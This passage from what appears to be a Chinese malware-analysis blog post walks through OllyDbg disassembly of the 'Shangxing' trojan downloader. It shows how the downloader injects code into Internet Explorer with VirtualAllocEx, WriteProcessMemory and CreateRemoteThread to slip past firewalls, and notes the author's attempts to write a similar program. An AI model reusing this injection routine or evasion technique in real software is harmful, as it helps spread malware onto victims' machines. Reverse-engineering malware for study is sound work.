
```asm
13143649     |.  83C0 04          add eax,4
1314364C     |.  83C0 14          add eax,14
1314364F     |.  8B78 38          mov edi,dword ptr ds:[eax+38]
13143652     |.  68 00800000      push 8000
13143657     |.  6A 00            push 0
13143659     |.  53               push ebx
1314365A     |.  56               push esi
1314365B     |.  E8 6CFEFFFF      call <jmp.&kernel32.VirtualFreeEx>
13143660     |.  6A 40            push 40
13143662     |.  68 00300000      push 3000
13143667     |.  57               push edi
13143668     |.  53               push ebx
13143669     |.  56               push esi
1314366A     |.  E8 55FEFFFF      call <jmp.&kernel32.VirtualAllocEx>
```

在 IE 进程内申请相应的内存空间

```asm
1314366F     |.  54               push esp                ; /pBytesWritten
13143670     |.  57               push edi                ; |BytesToWrite
13143671     |.  53               push ebx                ; |Buffer
13143672     |.  50               push eax                ; |Address
13143673     |.  56               push esi                ; |hProcess
13143674     |.  E8 63FEFFFF      call <jmp.&kernel32.WriteProcessMemory> ; \WriteProcessMemory
```

把代码写到内存

```asm
13143679     |.  8D4424 04        lea eax,dword ptr ss:[esp+4]
1314367D     |.  50               push eax
1314367E     |.  6A 00            push 0
13143680     |.  53               push ebx
13143681     |.  55               push ebp
13143682     |.  6A 00            push 0
13143684     |.  6A 00            push 0
13143686     |.  56               push esi
13143687     |.  E8 00FEFFFF      call <jmp.&kernel32.CreateRemoteThread>
```

创建一个线程执行代码

```asm
1314368C     |.  59               pop ecx
1314368D     |.  5A               pop edx
1314368E     |.  5D               pop ebp
1314368F     |.  5F               pop edi
13143690     |.  5E               pop esi
13143691     |.  5B               pop ebx
13143692     \.  C3               retn
             }

13143994     |.  53               push ebx                ; /hObject
13143995     |.  E8 EAFAFFFF      call <jmp.&kernel32.CloseHandle> ; \CloseHandle
1314399A     |.  33C0             xor eax,eax
1314399C     |.  5A               pop edx
1314399D     |.  59               pop ecx
1314399E     |.  59               pop ecx
1314399F     |.  64:8910          mov dword ptr fs:[eax],edx
131439A2     |.  68 B7391413      push Down.131439B7
131439A7     |>  8D45 F8          lea eax,dword ptr ss:[ebp-8]
131439AA     |.  E8 DDF5FFFF      call Down.13142F8C
131439AF     \.  C3               retn
            }
```

原来上兴下载者是通过注入 IE 进程达到穿墙的目的的。。下面的代码都一样的，你填写了多少个地址就会有相应的线程。。。。。

```asm
13143A6E      >  8D85 F0FEFFFF    lea eax,dword ptr ss:[ebp-110]
13143A74      .  8B15 A4401413    mov edx,dword ptr ds:[131440A4]         ;  你填写的第 2 个
13143A7A      .  E8 49ECFFFF       call Down.131426C8
13143A7F      .  8D85 F0FEFFFF    lea eax,dword ptr ss:[ebp-110]
13143A85      .  BA 503B1413      mov edx,Down.13143B50
13143A8A      .  33C9             xor ecx,ecx
13143A8C      .  8A08             mov cl,byte ptr ds:[eax]
13143A8E      .  41               inc ecx
13143A8F      .  E8 F0EAFFFF      call Down.13142584
13143A94      .  74 0F            je short Down.13143AA5
13143A96      .  A1 A4401413      mov eax,dword ptr ds:[131440A4]
13143A9B      .  A3 78561413      mov dword ptr ds:[13145678],eax
13143AA0      .  E8 7FFEFFFF      call Down.13143924
13143AA5      >  8D85 F0FEFFFF    lea eax,dword ptr ss:[ebp-110]
13143AAB      .  8B15 A8401413    mov edx,dword ptr ds:[131440A8]         ;  Down.13143754
13143AB1      .  E8 12ECFFFF      call Down.131426C8
13143AB6      .  8D85 F0FEFFFF    lea eax,dword ptr ss:[ebp-110]
13143ABC      .  BA 503B1413      mov edx,Down.13143B50
13143AC1      .  33C9             xor ecx,ecx
13143AC3      .  8A08             mov cl,byte ptr ds:[eax]
13143AC5      .  41               inc ecx
13143AC6      .  E8 B9EAFFFF      call Down.13142584
13143ACB      .  74 0F            je short Down.13143ADC
13143ACD      .  A1 A8401413      mov eax,dword ptr ds:[131440A8]
13143AD2      .  A3 78561413      mov dword ptr ds:[13145678],eax
13143AD7      .  E8 48FEFFFF      call Down.13143924
13143ADC      >  8D85 F0FEFFFF    lea eax,dword ptr ss:[ebp-110]
13143AE2      .  8B15 AC401413    mov edx,dword ptr ds:[131440AC]         ;  Down.13143798
13143AE8      .  E8 DBEBFFFF      call Down.131426C8
13143AED      .  8D85 F0FEFFFF    lea eax,dword ptr ss:[ebp-110]
13143AF3      .  BA 503B1413      mov edx,Down.13143B50
13143AF8      .  33C9             xor ecx,ecx
13143AFA      .  8A08             mov cl,byte ptr ds:[eax]
13143AFC      .  41               inc ecx
13143AFD      .  E8 82EAFFFF      call Down.13142584
13143B02      .  74 0F            je short Down.13143B13
13143B04      .  A1 AC401413      mov eax,dword ptr ds:[131440AC]
13143B09      .  A3 78561413      mov dword ptr ds:[13145678],eax
13143B0E      .  E8 11FEFFFF      call Down.13143924
13143B13      >  8D85 F0FEFFFF    lea eax,dword ptr ss:[ebp-110]
13143B19      .  8B15 B0401413    mov edx,dword ptr ds:[131440B0]         ;  Down.131437DC
13143B1F      .  E8 A4EBFFFF      call Down.131426C8
13143B24      .  8D85 F0FEFFFF    lea eax,dword ptr ss:[ebp-110]
13143B2A      .  BA 503B1413      mov edx,Down.13143B50
13143B2F      .  33C9             xor ecx,ecx
13143B31      .  8A08             mov cl,byte ptr ds:[eax]
13143B33      .  41               inc ecx
13143B34      .  E8 4BEAFFFF      call Down.13142584
13143B39      .  74 0F            je short Down.13143B4A
13143B3B      .  A1 B0401413      mov eax,dword ptr ds:[131440B0]
13143B40      .  A3 78561413      mov dword ptr ds:[13145678],eax
13143B45      .  E8 DAFDFFFF      call Down.13143924
13143B4A      >  E8 4DF3FFFF      call Down.13142E9C
```

代码很快就分析完了。。也学到了些东西，比如怎么写配置程序，怎么让自己的程序多了压缩功能等。可是由于自己编程实在太差了，用 VB 写老是出 BUG，用汇编写  
了几天也还有 BUG，好头痛啊。。。。 

`4dd466d0e1e0cc123afbe504da2462ca`
